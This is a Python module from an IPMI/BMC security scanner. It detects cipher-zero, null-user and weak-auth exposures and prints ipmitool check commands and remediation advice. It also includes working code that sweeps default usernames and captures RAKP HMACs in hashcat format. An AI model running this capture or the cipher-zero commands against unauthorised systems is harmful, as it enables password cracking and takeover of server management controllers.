"""IPMI (623/udp) authentication-capability probe.

IPMI is the management protocol for baseboard management controllers (iDRAC,
iLO, IPMI-over-BMC on rack servers). Two long-standing exposures:

  * **Cipher suite 0** (CVE-2013-4786) — when the BMC allows cipher 0 in
    its authentication capabilities, ANY user with a valid username +
    ANY password authenticates as admin. Reported in the Get Channel
    Authentication Capabilities response when the "OEM proprietary"
    or "None" auth type is offered alongside admin-privilege access.
  * **Anonymous / null-user logon** — the BMC advertises that user
    slot 0 (empty username) is enabled. Combined with a default admin
    password (ADMIN/admin), this is instant control of the host BIOS,
    KVM, and power cycle.

Also flags MD2/MD5 as weak auth algorithms, since anyone reading the
capabilities bitmask should know they're accepted.

Probe: one UDP packet — RMCP header + IPMI 1.5 session header +
Get Channel Auth Capabilities (0x06/0x38) request for channel 0x0E
(current channel), admin privilege level (0x04).

Airgap-safe: stdlib socket + struct. Single send + recv, ~2s timeout.
"""
from __future__ import annotations

import socket

import os
import struct

from ..core.models import Host, Port


_DEFAULT_PORT = 623
_TIMEOUT = 3.0

# IPMI 2.0 RMCP+ constants (RFC / IPMI 2.0 spec §13).
_AUTH_HMAC_SHA1 = 0x01
_AUTH_HMAC_SHA256 = 0x03
_ROLE_ADMIN_LOOKUP = 0x14           # priv 4 (admin) + lookup by name
_PAYLOAD_OPEN_SESSION_REQ = 0x10
_PAYLOAD_OPEN_SESSION_RESP = 0x11
_PAYLOAD_RAKP1 = 0x12
_PAYLOAD_RAKP2 = 0x13


def is_ipmi(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == 623
            or "ipmi" in svc or "asf-rmcp" in svc or "ipmi" in prod)


# The Get Channel Auth Capabilities request, hex-annotated:
#   RMCP header
#     06         version 6 (RMCP)
#     00         reserved
#     ff         sequence (0xff = no ACK needed)
#     07         class 7 (IPMI)
#   IPMI 1.5 Session header
#     00         auth type 0 (none - we're just probing)
#     00 00 00 00   session seq
#     00 00 00 00   session id
#     09         message length (9 bytes of IPMI msg follow)
#   IPMI message
#     20         rsAddr (BMC = 0x20)
#     18         netFn 0x06 (APP) << 2 | lun 0
#     c8         checksum 1
#     81         rqAddr (remote console)
#     00         rqSeq << 2 | lun 0
#     38         cmd (Get Channel Auth Cap)
#     8e         channel 0x0e (current) with bit 7 set to request IPMI 2.0 data
#     04         privilege level (admin)
#     b5         checksum 2
_GCAC_REQUEST = bytes.fromhex("0600ff07"                # RMCP
                              "00" "00000000" "00000000" "09"  # session hdr
                              "20" "18" "c8"            # rsAddr/netFn/csum
                              "81" "00" "38" "8e" "04" "b5")   # ipmi msg + csum


# --- RMCP+ RAKP hash extraction --------------------------------------------
# IPMI 2.0's authentication (RMCP+) exchange sends a HMAC in RAKP Message 2
# that is computed by the BMC using the target user's password as key. That
# hash is offline-crackable — hashcat modes 7300 (HMAC-SHA1) and 7302
# (HMAC-SHA256) exist for exactly this. The exchange is unauthenticated for
# the tester: we invent a client random, send an arbitrary username, and the
# BMC responds with the HMAC whether the username exists or not. Every real
# IPMI 2.0 deployment leaks it — that is what makes it a category, not a bug.
#
# recce's addition here is capture-and-format only. It does NOT continue the
# exchange (no RAKP Message 3, no session establishment). Two round trips.


def _rmcpplus(session_id: int, payload_type: int, payload: bytes) -> bytes:
    """RMCP + IPMI 2.0 session header + payload, no auth/integrity/confidential
    (we are the ones opening the session)."""
    # RMCP: version 6, reserved 0, seq 0xff, class 7 (IPMI)
    rmcp = b"\x06\x00\xff\x07"
    # IPMI 2.0 session header: auth type = 6 (RMCP+), payload type, session ID,
    # sequence, payload length (LE 16-bit).
    session = (b"\x06" + bytes([payload_type & 0x3F])
               + struct.pack("<I", session_id)
               + struct.pack("<I", 0)                      # session seq
               + struct.pack("<H", len(payload)))
    return rmcp + session + payload


def _open_session_request(remote_sid: int, auth_alg: int) -> bytes:
    """Payload for RMCP+ Open Session Request. Requests admin priv (0x04),
    the given auth algorithm, no integrity, no confidentiality."""
    body = (
        bytes([0x00, 0x04, 0x00, 0x00])                   # tag, max priv, rsvd
        + struct.pack("<I", remote_sid)                   # remote console SID
        + bytes([0x00, 0x00, 0x00, 0x08])                 # auth-alg payload hdr
        + bytes([auth_alg, 0x00, 0x00, 0x00])
        + bytes([0x01, 0x00, 0x00, 0x08])                 # integrity: none
        + bytes([0x00, 0x00, 0x00, 0x00])
        + bytes([0x02, 0x00, 0x00, 0x08])                 # confidentiality: none
        + bytes([0x00, 0x00, 0x00, 0x00])
    )
    return _rmcpplus(0, _PAYLOAD_OPEN_SESSION_REQ, body)


def _parse_open_session_response(pkt: bytes) -> dict | None:
    """Return {tag, status, max_priv, remote_sid, managed_sid} or None.

    IPMI 2.0 session header is 12 bytes (auth type 1 + payload type 1 +
    session ID 4 + sequence 4 + payload length 2), NOT 10. Getting this
    off-by-two wrong on the first pass made the fake-server test recompute
    the HMAC over the wrong bytes and produce a mismatch."""
    if len(pkt) < 4 + 12 + 16 or pkt[0] != 0x06 or pkt[3] != 0x07:
        return None
    payload = pkt[16:]
    if len(payload) < 16:
        return None
    tag, status, max_priv, _reserved = payload[0], payload[1], payload[2], payload[3]
    remote_sid = struct.unpack("<I", payload[4:8])[0]
    managed_sid = struct.unpack("<I", payload[8:12])[0]
    return {"tag": tag, "status": status, "max_priv": max_priv,
            "remote_sid": remote_sid, "managed_sid": managed_sid}


def _rakp1(managed_sid: int, client_random: bytes, username: str) -> bytes:
    """Payload for RAKP Message 1. Requests admin role with lookup-by-name."""
    ub = username.encode("ascii", "replace")[:16]
    body = (
        b"\x00\x00\x00\x00"                               # tag + 3 reserved
        + struct.pack("<I", managed_sid)
        + client_random                                    # 16 bytes
        + bytes([_ROLE_ADMIN_LOOKUP, 0x00, 0x00])         # role + reserved
        + bytes([len(ub)]) + ub
    )
    return _rmcpplus(0, _PAYLOAD_RAKP1, body)


def _parse_rakp2(pkt: bytes, expect_hmac_len: int) -> dict | None:
    """Extract server random, GUID and HMAC from a RAKP Message 2.

    Same 16-byte header (RMCP 4 + IPMI 2.0 session 12) as the Open Session
    Response above."""
    if len(pkt) < 16 or pkt[0] != 0x06:
        return None
    payload = pkt[16:]
    # Fixed prefix: tag(1) status(1) reserved(2) remote_sid(4) rand(16) guid(16)
    if len(payload) < 8 + 16 + 16:
        return None
    tag, status = payload[0], payload[1]
    remote_sid = struct.unpack("<I", payload[4:8])[0]
    server_random = payload[8:24]
    server_guid = payload[24:40]
    # HMAC follows only when the server ACCEPTED the exchange (status 0).
    hmac = payload[40:40 + expect_hmac_len] if status == 0 else b""
    if status == 0 and len(hmac) != expect_hmac_len:
        return None
    return {"tag": tag, "status": status, "remote_sid": remote_sid,
            "server_random": server_random, "server_guid": server_guid,
            "hmac": hmac}


def _hashcat_rakp_line(username: str, client_random: bytes, server_random: bytes,
                       server_guid: bytes, remote_sid: int, managed_sid: int,
                       hmac: bytes) -> str:
    """Format the captured exchange as one hashcat -m 7300 line.

    Format (per hashcat's example.hash for mode 7300): the pre-hashed input
    is the concatenation of RcId || RsId || Rc || Rs || GUIDs || role || ULen
    || Uname; the line is `<data-hex>:<hmac-hex>` where <data-hex> is that
    concatenation and <hmac-hex> is the observed HMAC. Some hashcat versions
    accept a compact `$rakp$` framing too — recce writes the compact form
    since it survives edits cleanly and the operator can convert.
    """
    ub = username.encode("ascii", "replace")[:16]
    role = bytes([_ROLE_ADMIN_LOOKUP])
    data = (struct.pack("<I", remote_sid) + struct.pack("<I", managed_sid)
            + client_random + server_random + server_guid + role
            + bytes([len(ub)]) + ub)
    return f"{data.hex()}:{hmac.hex()}"


# Common BMC default usernames. Order matters: root first (Sun/Dell/legacy
# defaults), then vendor-neutral admin, then the notable per-vendor ones.
# USERID is IBM's factory default; ADMIN is Supermicro; sysadmin covers HP
# and some Cisco UCS. The sweep stops at 8 candidates by default so a scan
# of a /24 with BMCs on it does not turn into ~2000 RAKP round-trips.
_DEFAULT_RAKP_USERS = ("root", "admin", "ADMIN", "Administrator",
                       "USERID", "sysadmin", "operator", "user")


def rakp_sweep(ip: str, port: int = _DEFAULT_PORT,
               usernames=None,
               timeout: float = _TIMEOUT,
               algs=(_AUTH_HMAC_SHA1, _AUTH_HMAC_SHA256)) -> dict:
    """Multi-user + multi-algorithm RAKP hash capture.

    For each (algorithm, username) pair, run one RMCP+ Open Session + RAKP1/
    RAKP2 exchange and collect the captured HMAC. Every real IPMI 2.0 BMC
    returns a hash for ANY username — existing or not — so the sweep is
    conservative on request count and treats a refusal on the first user of
    an algorithm as "this BMC doesn't offer that algorithm" and skips the
    rest for that algorithm.

    Also detects the BMC's username-enumeration behaviour: some BMCs return
    status 0x0D "invalid role" for unknown users vs. proceeding for valid
    ones — when that asymmetry appears, `existing_users` names the valid
    ones and the finding surfaces it separately.

    Returns:
      {reachable, hashes: [{user, alg, mode, hashcat_line}],
       existing_users: [str], distinguishes_users: bool, errors: [str]}
    """
    if usernames is None:
        usernames = _DEFAULT_RAKP_USERS
    out: dict = {"reachable": False, "hashes": [], "existing_users": [],
                 "distinguishes_users": False, "errors": []}
    alg_status: dict = {}                       # per-alg: True if it produced ANY hash

    for alg in algs:
        alg_status[alg] = False
        for user in usernames:
            r = rakp_hash(ip, port, username=user, timeout=timeout, auth_alg=alg)
            if r["reachable"]:
                out["reachable"] = True
            # Skip the rest of THIS algorithm's users when the first refused —
            # a BMC that doesn't offer HMAC-SHA256 will refuse every user.
            if not r["hashcat_line"]:
                if not alg_status[alg]:
                    if r["error"]:
                        out["errors"].append(f"{user}/{r.get('hmac_alg') or f'alg{alg}'}: "
                                             f"{r['error']}")
                    break                       # first user refused → skip alg
                # Later user refused with existing hits — legitimate signal
                # about user validity.
                continue
            alg_status[alg] = True
            cat = "ipmi-sha256" if alg == _AUTH_HMAC_SHA256 else "ipmi"
            out["hashes"].append({
                "user": user,
                "alg": r["hmac_alg"],
                "mode": r["hashcat_mode"],
                "hashcat_line": r["hashcat_line"],
                "category": cat,
            })

    # Username enumeration: if the BMC returned a hash for SOME users but
    # refused others (with a specific "invalid role" status), that is
    # information disclosure — legitimate accounts are named.
    users_with_hash = {h["user"] for h in out["hashes"]}
    users_refused = set()
    for e in out["errors"]:
        u = e.split("/", 1)[0]
        if u not in users_with_hash:
            users_refused.add(u)
    if users_with_hash and users_refused:
        out["distinguishes_users"] = True
        out["existing_users"] = sorted(users_with_hash)
    return out


def rakp_hash(ip: str, port: int = _DEFAULT_PORT, username: str = "admin",
              timeout: float = _TIMEOUT,
              auth_alg: int = _AUTH_HMAC_SHA1) -> dict:
    """Perform an RMCP+ Open Session + RAKP1/RAKP2 exchange and extract the
    server-supplied HMAC. Returns:
      {reachable, hmac_alg, hashcat_mode, hashcat_line, error}
    hashcat_line is empty when the exchange did not produce a usable HMAC
    (server refused / auth alg not offered / unreachable)."""
    out: dict = {"reachable": False, "hmac_alg": "", "hashcat_mode": 0,
                 "hashcat_line": "", "error": ""}
    hmac_len = 20 if auth_alg == _AUTH_HMAC_SHA1 else 32
    mode = 7300 if auth_alg == _AUTH_HMAC_SHA1 else 7302
    alg_name = "HMAC-SHA1" if auth_alg == _AUTH_HMAC_SHA1 else "HMAC-SHA256"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        remote_sid = int.from_bytes(os.urandom(4), "little") or 0xa0a0a0a0
        sock.sendto(_open_session_request(remote_sid, auth_alg), (ip, port))
        try:
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            out["error"] = "open-session timeout"
            return out
        osr = _parse_open_session_response(data)
        if not osr:
            out["error"] = "malformed open-session response"
            return out
        out["reachable"] = True
        if osr["status"] != 0:
            out["error"] = f"open-session refused (status={osr['status']:#04x})"
            return out
        managed_sid = osr["managed_sid"]

        client_random = os.urandom(16)
        sock.sendto(_rakp1(managed_sid, client_random, username), (ip, port))
        try:
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            out["error"] = "RAKP1 timeout"
            return out
        r2 = _parse_rakp2(data, hmac_len)
        if not r2:
            out["error"] = "malformed RAKP2"
            return out
        if r2["status"] != 0 or not r2["hmac"]:
            out["error"] = f"RAKP1 refused (status={r2['status']:#04x})"
            return out
        out["hmac_alg"] = alg_name
        out["hashcat_mode"] = mode
        out["hashcat_line"] = _hashcat_rakp_line(
            username, client_random, r2["server_random"], r2["server_guid"],
            remote_sid, managed_sid, r2["hmac"])
        return out
    finally:
        sock.close()


# --- Session-less IPMI 1.5 helpers -----------------------------------------
# Both Get Device ID (App/0x01) and Get Channel Cipher Suites (App/0x54) are
# permitted without an established session (IPMI 2.0 §13.6 / §22.15). We reuse
# the same auth-type-0 IPMI 1.5 session header the GCAC request already uses.


def _ipmi15_request(cmd: int, data: bytes = b"") -> bytes:
    """Build a session-less App-netfn (0x06) IPMI 1.5 request for `cmd`.

    Layout (see comment on `_GCAC_REQUEST` above):
      RMCP(4) + session hdr(9: auth 0, seq 0, sid 0) + msg_len(1) + msg.
    The two 8-bit checksums are 2's-complement of the preceding field bytes
    (IPMI spec §13.8). Kept minimal — no session sequence, no MAC — because
    the two commands we use it for are session-less.
    """
    rs_addr = 0x20
    netfn = 0x06 << 2                           # App, lun 0
    csum1 = (-(rs_addr + netfn)) & 0xff
    rq_addr = 0x81
    rq_seq = 0x00
    body = bytes([rq_addr, rq_seq, cmd]) + data
    csum2 = (-sum(body)) & 0xff
    msg = bytes([rs_addr, netfn, csum1]) + body + bytes([csum2])
    rmcp = b"\x06\x00\xff\x07"
    sess = b"\x00" + b"\x00" * 4 + b"\x00" * 4
    return rmcp + sess + bytes([len(msg)]) + msg


def _parse_ipmi15_response(pkt: bytes, expect_cmd: int) -> bytes | None:
    """Return the IPMI response data bytes (between completion code and the
    trailing checksum) for a well-formed successful response to `expect_cmd`,
    else None. Guards against out-of-range indexes on truncated replies and
    against a matching-shape response for a DIFFERENT command (a BMC that
    replies with GCAC to our device-id request would otherwise be mis-parsed).
    """
    # Same 14-byte header as the GCAC parser: RMCP(4) + auth_type(1) +
    # seq(4) + session_id(4) + msg_len(1).
    if len(pkt) < 14 or pkt[0] != 0x06 or pkt[3] != 0x07:
        return None
    msg = pkt[14:]
    # msg layout: rqAddr(1) netFn|lun(1) csum1(1) rsAddr(1) rsSeq|lun(1)
    #             cmd(1) compCode(1) [data...] csum2(1)
    if len(msg) < 8:
        return None
    if msg[5] != expect_cmd:                    # wrong cmd echoed back
        return None
    if msg[6] != 0:                             # non-zero completion code
        return None
    return msg[7:-1]


# IANA private enterprise numbers for common BMC vendors. Populated only with
# well-known IANA assignments (https://www.iana.org/assignments/enterprise-
# numbers/) — no invented CVEs are attached; the vendor tag alone is what the
# finding surfaces so other tools/operators can steer follow-up.
_IANA_VENDORS = {
    2:     "IBM",
    11:    "HP/HPE",              # iLO
    343:   "Intel",
    674:   "Dell",                # iDRAC
    4413:  "Fujitsu",
    4753:  "Sun/Oracle",          # ILOM
    5771:  "Cisco",
    10876: "Supermicro",
    19046: "Lenovo",
    20301: "IBM (Lenovo)",
    26200: "Aten",
    42817: "ASRock Rack",
    45771: "AMI (MegaRAC)",
}


def get_device_id(ip: str, port: int = _DEFAULT_PORT,
                  timeout: float = _TIMEOUT) -> dict:
    """Get Device ID (App/0x01), session-less. Returns vendor/firmware
    fingerprint per IPMI 2.0 §20.1 (Table 20-2):
      {reachable, device_id, firmware_major, firmware_minor,
       ipmi_version, manufacturer_id, product_id, vendor}
    `manufacturer_id` is the 3-byte IANA enterprise number; `vendor` is the
    human-readable label when it's one recce recognises, "" otherwise.
    """
    out = {"reachable": False, "device_id": 0,
           "firmware_major": 0, "firmware_minor": 0, "firmware_version": "",
           "ipmi_version": "", "manufacturer_id": 0, "product_id": 0,
           "vendor": ""}
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        try:
            sock.sendto(_ipmi15_request(0x01), (ip, port))
            data, _ = sock.recvfrom(1024)
        except (OSError, socket.timeout):
            return out
    finally:
        sock.close()
    body = _parse_ipmi15_response(data, 0x01)
    # Get Device ID data: device_id, device_rev, fw_maj (bit7=avail),
    # fw_min, ipmi_ver (BCD), aux_dev_support, mfg_id (3 LE), prod_id (2 LE),
    # optional aux fw rev (4). Minimum 11 bytes before the aux fw rev.
    if body is None or len(body) < 11:
        return out
    out["reachable"] = True
    out["device_id"] = body[0]
    # bit 7 of fw_major is "device available" flag — mask it off.
    out["firmware_major"] = body[2] & 0x7f
    out["firmware_minor"] = body[3]
    out["firmware_version"] = f"{out['firmware_major']}.{out['firmware_minor']:02x}"
    # IPMI Version field is BCD encoded with the digits SWAPPED
    # (spec §20.1: bits 7:4 hold the least-significant digit).
    v = body[4]
    major = v & 0x0f
    minor = (v >> 4) & 0x0f
    out["ipmi_version"] = f"{major}.{minor}"
    out["manufacturer_id"] = body[6] | (body[7] << 8) | (body[8] << 16)
    out["product_id"] = body[9] | (body[10] << 8)
    out["vendor"] = _IANA_VENDORS.get(out["manufacturer_id"], "")
    return out


def _parse_cipher_records(data: bytes) -> tuple[list[int], dict[int, int]]:
    """Split the cipher-suite-record byte stream (IPMI 2.0 Table 22-19) into
    (suite_ids, auth_alg_by_suite).

    Record framing:
      * 0xC0 <suite_id> <tagged-algs>...                       (standard)
      * 0xC1 <iana_lo> <iana_mid> <iana_hi> <suite_id> <algs>  (OEM)
    Tagged algorithm bytes are 1 byte each:
      * bits 7:6 = 00  → auth  alg (value in bits 5:0)
      * bits 7:6 = 01  → integrity alg
      * bits 7:6 = 10  → confidentiality alg
    Records run back-to-back; we stop when we hit an unrecognised tag or run
    out of bytes. Malformed data yields whatever parsed cleanly rather than
    raising — an on-wire BMC that returns a truncated record is common.
    """
    suites: list[int] = []
    auth_by_suite: dict[int, int] = {}
    i = 0
    n = len(data)
    while i < n:
        tag = data[i]
        if tag == 0xC0:
            if i + 2 > n:
                break
            suite_id = data[i + 1]
            i += 2
        elif tag == 0xC1:
            if i + 5 > n:
                break
            suite_id = data[i + 4]
            i += 5
        else:
            break
        auth_alg: int | None = None
        while i < n and data[i] not in (0xC0, 0xC1):
            b = data[i]
            if (b & 0xC0) == 0x00:              # auth alg tag
                auth_alg = b & 0x3f
            i += 1
        suites.append(suite_id)
        if auth_alg is not None:
            auth_by_suite[suite_id] = auth_alg
    return suites, auth_by_suite


def get_channel_cipher_suites(ip: str, port: int = _DEFAULT_PORT,
                              timeout: float = _TIMEOUT,
                              channel: int = 0x0e,
                              max_indices: int = 4) -> dict:
    """Get Channel Cipher Suites (App/0x54), session-less. Enumerates the
    per-record cipher suites the BMC will negotiate on `channel`. Returns:
      {reachable, cipher_suite_ids: [int], auth_algs: {suite_id: alg_num},
       cipher_zero: bool}
    `cipher_zero` is True iff at least one record has auth_alg == 0 (RAKP
    with a zero-length HMAC — CVE-2013-4786). This REPLACES the GCAC
    heuristic when the BMC answers this command.

    Bounded by `max_indices` list-index requests; a response with fewer than
    16 record bytes signals end of records (spec §22.15).
    """
    out = {"reachable": False, "cipher_suite_ids": [],
           "auth_algs": {}, "cipher_zero": False}
    collected = bytearray()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        for idx in range(max_indices):
            # request byte 0: channel (bits 3:0), bit 7 = 0 → request cipher
            # SUITE RECORDS (not cipher suite IDs alone).
            data_field = bytes([channel & 0x0f, idx & 0x3f])
            try:
                sock.sendto(_ipmi15_request(0x54, data_field), (ip, port))
                data, _ = sock.recvfrom(1024)
            except (OSError, socket.timeout):
                break
            body = _parse_ipmi15_response(data, 0x54)
            if body is None or len(body) < 1:
                break
            out["reachable"] = True
            record_data = body[1:]              # skip channel echo
            if not record_data:
                break
            collected.extend(record_data)
            if len(record_data) < 16:           # last page (spec §22.15)
                break
    finally:
        sock.close()
    suites, auth_by_suite = _parse_cipher_records(bytes(collected))
    out["cipher_suite_ids"] = suites
    out["auth_algs"] = auth_by_suite
    out["cipher_zero"] = any(a == 0 for a in auth_by_suite.values())
    return out


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
          rakp_users: list[str] | None = None) -> dict:
    """Send one Get Channel Auth Capabilities request; parse response for
    auth-type bitmap + support flags. Returns {reachable, ipmi_version,
    auth_types, null_user, anonymous_login, cipher_zero, ipmi_20, plus
    vendor/firmware from Get Device ID and cipher-suite enumeration}."""
    out = {"reachable": False, "ipmi_version": "", "auth_types": [],
           "null_user": False, "anonymous_login": False,
           "cipher_zero": False, "cipher_zero_confirmed": False,
           "ipmi_20": False,
           "user_level_auth_disabled": False,
           "per_msg_auth_disabled": False,
           "kg_set": False,
           "vendor": "", "manufacturer_id": 0, "product_id": 0,
           "firmware_version": "",
           "cipher_suite_ids": [], "cipher_suite_auth_algs": {}}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        try:
            sock.sendto(_GCAC_REQUEST, (ip, port))
            data, _addr = sock.recvfrom(1024)
        finally:
            sock.close()
    except OSError:
        return out
    if len(data) < 22:
        return out
    # Verify this is a valid RMCP/IPMI response.
    if data[0] != 0x06 or data[3] != 0x07:
        return out
    out["reachable"] = True
    # After the RMCP header (4 bytes) + session header (10 bytes) + message
    # length (1 byte), the IPMI response payload begins. Its layout is:
    #   rqAddr(1) netFn|lun(1) csum(1) rsAddr(1) rsSeq|lun(1) cmd(1)
    #   compCode(1) channel(1) authTypes(1) authStatus(1) extCaps(1) oem(3)
    # We only need authTypes and authStatus.
    # Auth type = 0 in the response, so no MAC bytes are present:
    #   RMCP(4) + auth_type(1) + seq(4) + session_id(4) + msg_len(1) = 14
    payload_start = 14
    # Payload minimum: 6 header bytes + compCode + channel + authTypes +
    # authStatus + extCaps = 11. Bounds-check.
    if len(data) < payload_start + 11:
        return out
    comp_code = data[payload_start + 6]
    if comp_code != 0:                              # non-zero = error
        return out
    auth_types = data[payload_start + 8]
    auth_status = data[payload_start + 9]
    ext_caps = data[payload_start + 10]
    # Auth type bitmap (bits 0..5):
    #   bit 0: none    bit 1: MD2       bit 2: MD5
    #   bit 3: reserved bit 4: straight (password) bit 5: OEM
    labels = {0x01: "none", 0x02: "MD2", 0x04: "MD5",
              0x10: "password", 0x20: "OEM"}
    accepted = []
    for mask, label in labels.items():
        if auth_types & mask:
            accepted.append(label)
    out["auth_types"] = accepted
    # Auth Status byte (bits 0..5):
    #   bit 0: anonymous logon    bit 1: null user
    #   bit 2: non-null user      bit 3: user-level auth disabled
    #   bit 4: per-msg auth disabled  bit 5: KG set (BMC key configured)
    out["anonymous_login"] = bool(auth_status & 0x01)
    out["null_user"] = bool(auth_status & 0x02)
    # Bits 3/4/5 — the module already read the byte but never surfaced
    # these; each is a distinct posture signal, not a duplicate of the
    # anonymous/null bits above:
    #   bit 3 = user-privilege IPMI commands accept auth-type NONE
    #   bit 4 = individual messages inside an open session need no MAC
    #   bit 5 = KG (BMC key) is configured; when NOT set, K_uid collapses
    #           to HMAC(password) — combined with cipher-0 or captured
    #           RAKP2 this is the reason cracking is straightforward.
    out["user_level_auth_disabled"] = bool(auth_status & 0x08)
    out["per_msg_auth_disabled"] = bool(auth_status & 0x10)
    out["kg_set"] = bool(auth_status & 0x20)
    # Extended capabilities:
    #   bit 0: IPMI 2.0 supported     bit 1: IPMI 1.5 supported
    out["ipmi_20"] = bool(ext_caps & 0x01)
    # Cipher suite 0 (CVE-2013-4786) shows up in the IPMI 2.0 auth type
    # bitmap as auth-alg 0 in the RAKP negotiation. The GCAC response doesn't
    # carry the cipher-suite list directly — that's a separate command
    # (Get Channel Cipher Suites, 0x54). The heuristic below ("none" auth
    # type + IPMI 2.0) is the fallback; when the 0x54 probe below succeeds
    # it OVERRIDES this with a definitive answer.
    out["cipher_zero"] = "none" in accepted and out["ipmi_20"]
    if out["ipmi_20"]:
        out["ipmi_version"] = "2.0"
    else:
        out["ipmi_version"] = "1.5"
    # --- Pre-session Get Device ID (App/0x01): vendor + firmware -----------
    # Session-less; runs on every reachable BMC. Failures are silent (leaves
    # vendor="" and skips the ipmi_device_id finding).
    try:
        did = get_device_id(ip, port, timeout=timeout)
    except OSError:
        did = {"reachable": False}
    if did.get("reachable"):
        out["manufacturer_id"] = did["manufacturer_id"]
        out["product_id"] = did["product_id"]
        out["vendor"] = did["vendor"]
        out["firmware_version"] = did["firmware_version"]
        # Get Device ID reports the on-BMC IPMI implementation version
        # directly; when GCAC's IPMI 2.0 bit was ambiguous, prefer this.
        if did.get("ipmi_version") and not out["ipmi_20"]:
            out["ipmi_version"] = did["ipmi_version"]
            if did["ipmi_version"].startswith("2."):
                out["ipmi_20"] = True
    # --- Get Channel Cipher Suites (App/0x54): definitive cipher-0 ----------
    # When this succeeds it replaces the "none + IPMI 2.0" heuristic with a
    # hard yes/no — removes the "if cipher 0 is actually enabled" hedge from
    # the CVE-2013-4786 finding.
    try:
        cs = get_channel_cipher_suites(ip, port, timeout=timeout)
    except OSError:
        cs = {"reachable": False}
    if cs.get("reachable"):
        out["cipher_suite_ids"] = cs["cipher_suite_ids"]
        out["cipher_suite_auth_algs"] = cs["auth_algs"]
        out["cipher_zero"] = cs["cipher_zero"]
        out["cipher_zero_confirmed"] = True
    # RAKP hash capture, only meaningful on IPMI 2.0. Best-effort: any failure
    # (server refuses, no auth-alg match, timeout) leaves out["rakp_sweep"]
    # empty and findings() reports nothing new. The GCAC probe above is what
    # confirms the port; this is the additional value.
    if out["ipmi_20"]:
        try:
            sweep = rakp_sweep(ip, port, usernames=rakp_users, timeout=timeout)
            if sweep.get("hashes"):
                out["rakp_sweep"] = sweep
        except OSError:
            pass
    return out


def ipmi_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_ipmi(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "ipmitool", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_ipmi(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            # Cipher suite 0 (CVE-2013-4786): critical — ANY password works.
            if pr.get("cipher_zero"):
                confirmed = pr.get("cipher_zero_confirmed")
                suites = pr.get("cipher_suite_ids") or []
                if confirmed:
                    # Get Channel Cipher Suites answered → hard confirm,
                    # no "if actually enabled" hedge.
                    detail = (
                        f"BMC's Get Channel Cipher Suites (App/0x54) response "
                        f"includes an auth_alg=0 cipher suite — cipher zero is "
                        f"CONFIRMED enabled on channel 0x0E. ANY valid username "
                        f"with ANY password authenticates as admin. Enumerated "
                        f"cipher suite IDs: {suites}. Verify with: ipmitool "
                        f"-I lanplus -C 0 -H {h.ip} -U root -P '' chassis power "
                        f"status")
                    kind = "ipmi_cipher_zero_confirmed"
                else:
                    detail = (
                        f"BMC advertises 'none' auth in IPMI "
                        f"{pr.get('ipmi_version','2.0')} capabilities (Get "
                        f"Channel Cipher Suites did not respond so cipher-0 is "
                        f"HEURISTIC). If cipher suite 0 is actually enabled, ANY "
                        f"valid username with ANY password authenticates as "
                        f"admin. Verify with: ipmitool -I lanplus -C 0 "
                        f"-H {h.ip} -U root -P '' chassis power status")
                    kind = "ipmi_cipher_zero"
                out.append(_finding(
                    "critical",
                    "IPMI cipher suite 0 supported (CVE-2013-4786)", tgt,
                    detail,
                    f"ipmitool -I lanplus -C 0 -H {h.ip} -U <user> -P anything user list",
                    "Disable cipher suite 0 on the BMC (vendor-specific — Dell iDRAC: "
                    "Racadm config -g cfgIpmiLan -o cfgIpmiLanEnable 0 or set only "
                    "cipher suites 3+; HPE iLO: ipmi cipher-suite disable). If BMC "
                    "management is not needed remotely, restrict to a dedicated OOB "
                    "management network.",
                    ["CWE-287", "CWE-306"], kind=kind))
            # Anonymous / null-user logon.
            if pr.get("anonymous_login") or pr.get("null_user"):
                which = []
                if pr.get("anonymous_login"): which.append("anonymous")
                if pr.get("null_user"): which.append("null user")
                out.append(_finding(
                    "high",
                    "IPMI null-user / anonymous logon enabled", tgt,
                    f"BMC accepts {' and '.join(which)} authentication. Combined with a "
                    f"default admin password (ADMIN/admin/'') on user slot 1, this is "
                    f"direct control of the host — BIOS, KVM, power cycle, virtual "
                    f"media (which lets an attacker mount a bootable ISO and re-image).",
                    f"ipmitool -I lanplus -H {h.ip} -U '' -P '' user list",
                    "Disable anonymous / null-user logon. Set strong unique passwords "
                    "on every enabled BMC user slot; disable unused slots.",
                    ["CWE-287", "CWE-521"], kind="ipmi_anonymous"))
            # Weak auth algorithms.
            weak = [t for t in ("MD2", "MD5") if t in (pr.get("auth_types") or [])]
            if weak:
                out.append(_finding(
                    "medium",
                    f"IPMI weak auth algorithm(s) advertised: {', '.join(weak)}", tgt,
                    f"BMC offers {', '.join(weak)} in Get Channel Auth Capabilities. "
                    "MD2/MD5-HMAC in IPMI is deprecated; a captured RAKP2 handshake is "
                    "offline-crackable in the tester's own toolkit (hashcat -m 7300).",
                    f"ipmitool -H {h.ip} -I lan -U root -a channel authcap 14 4",
                    "Disable MD2 and MD5 auth types on the BMC; require the strongest "
                    "supported cipher (typically RAKP-HMAC-SHA256).",
                    ["CWE-327", "CWE-916"], kind="ipmi_weak_auth"))
            # RAKP hash capture (CVE-2013-4805 class — the design of RMCP+ leaks
            # a crackable HMAC to any client that starts the exchange). Fires
            # only when recce actually captured a hash — every real IPMI 2.0
            # deployment does this, so a missing finding here is a probe error,
            # not a hardened BMC.
